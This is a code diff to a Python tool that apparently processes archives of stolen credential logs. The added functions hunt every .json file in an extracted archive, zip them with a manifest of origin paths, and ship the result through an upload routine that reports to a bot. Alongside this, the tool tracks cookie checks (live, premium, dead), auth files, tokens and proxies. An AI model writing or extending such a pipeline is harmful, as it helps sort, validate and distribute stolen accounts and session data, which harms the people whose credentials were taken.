@@ -1338,6 +1338,58 @@ def pack_tokens(files):
                    ("=" * 48, "\n".join(manifest)))
     return zp, total
 
+def find_json(roots):
+    """Every .json in the trees except auth.json (that one has its own flow)."""
+    out = []
+    for root in roots:
+        try:
+            if not root or not Path(root).exists():
+                continue
+            for p in root.rglob("*"):
+                try:
+                    if p.is_file() and p.name.lower().endswith(".json") \
+                            and p.name.lower() != "auth.json":
+                        out.append(p)
+                except OSError:
+                    continue
+        except OSError:
+            continue
+    return out
+
+def pack_json(files):
+    """json_files.zip: every JSON with its ORIGINAL name; duplicate names get
+    name_#1.json, name_#2.json… found_in.txt maps each to its origin path."""
+    if not files:
+        return None, 0
+    zp = OUT / "json_files.zip"
+    used, manifest, total = {"", }, [], 0
+    base = WORK / "ex"
+    with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
+        for p in files:
+            stem, ext = os.path.splitext(p.name)
+            name, k = p.name, 1
+            while name.lower() in used:
+                name = "%s_#%d%s" % (stem, k, ext)
+                k += 1
+            try:
+                z.write(str(p), name)
+            except Exception:
+                continue
+            used.add(name.lower())
+            try:
+                rel = str(p.relative_to(base))
+            except Exception:
+                rel = str(p)
+            manifest.append("%s  <-  %s" % (name, rel))
+            total += 1
+        if not total:
+            zp.unlink(missing_ok=True)
+            return None, 0
+        z.writestr("found_in.txt",
+                   "JSON FILES FOUND IN THE ARCHIVE\n%s\n%s\n" %
+                   ("=" * 48, "\n".join(manifest)))
+    return zp, total
+
 def finish(task, stage, **extra):
     """Terminal state for a job: paint the card, report to the bot, back to idle."""
     st(stage, 100 if stage == "done" else _state.get("pct", 0),
@@ -1348,6 +1400,7 @@ def finish(task, stage, **extra):
                     if k in ("err", "found", "cookies", "tried", "sent", "failed",
                              "links", "auth", "auth_sent", "auth_fid", "td_total",
                              "td_parts", "td_via", "tok_total", "tok_parts",
+                             "js_total", "js_parts",
                              "ck_total", "ck_live", "ck_prem", "ck_free",
                              "ck_exp", "ck_dead", "ck_err", "ck_zip", "ck_proxies")})
     payload["pubs"] = PB[3]
@@ -1459,6 +1512,33 @@ def process(task):
         tok_parts, tok_link = ship(tok_zip, tok_cap)
         if tok_link:
             links["tokens"] = tok_link
+    js_zip, js_total = None, 0
+    if task.get("json"):
+        st("scan", 44, msg="hunting every .json in the archive")
+        jsf = find_json([WORK / "ex", WORK / "tdex", WORK / "tdfull"])
+        if not jsf:
+            # the filtered extract only keeps .txt/.log/.cookie/auth.json —
+            # pull all the other .json files now
+            st("extract", 45, msg="pulling every .json from the archive")
+            try:
+                _extract(arc, WORK / "jx", task.get("passwords") or [],
+                         ["*.json"])
+            except Exception as e:
+                sys.stdout.write("jx pass: %s\n" % e); sys.stdout.flush()
+            jsf = find_json([WORK / "jx"])
+        js_zip, js_total = pack_json(jsf)
+    js_parts, js_link = 0, None
+    if js_zip:
+        def js_cap(size, idx, count, tot, split):
+            return (f"{gold_header('JSON FILES', esc('%d found' % js_total))}\n{THIN}\n"
+                    f"🗂 {bold('Files')}    {code(js_total)} × {code('.json')}\n"
+                    f"🏷 {bold('Names')}    original names — duplicates become "
+                    f"{code('name_#1.json')}, {code('name_#2.json')}\n"
+                    + ship_note(idx, count, size, tot, split, "json_files.zip") +
+                    f"🗝 {bold('Manifest')}  found_in.txt shows each origin path")
+        js_parts, js_link = ship(js_zip, js_cap)
+        if js_link:
+            links["json"] = js_link
     ck = check_auths(auths) if (want_auth and task.get("authcheck") and auths) else {}
     shutil.rmtree(WORK, ignore_errors=True)
     st("done", 100, job=task.get("job"), vm=SPECS)
@@ -1466,7 +1546,8 @@ def process(task):
            failed=failed, links=links, auth=len(auths) if want_auth else 0,
            auth_sent=auth_sent, auth_fid=auth_fid if want_auth else None,
            td_total=td_total, td_parts=td_parts, td_via=td_via,
-           tok_total=tok_total, tok_parts=tok_parts, **ck)
+           tok_total=tok_total, tok_parts=tok_parts,
+           js_total=js_total, js_parts=js_parts, **ck)
 
 def main():
     OUT.mkdir(parents=True, exist_ok=True)
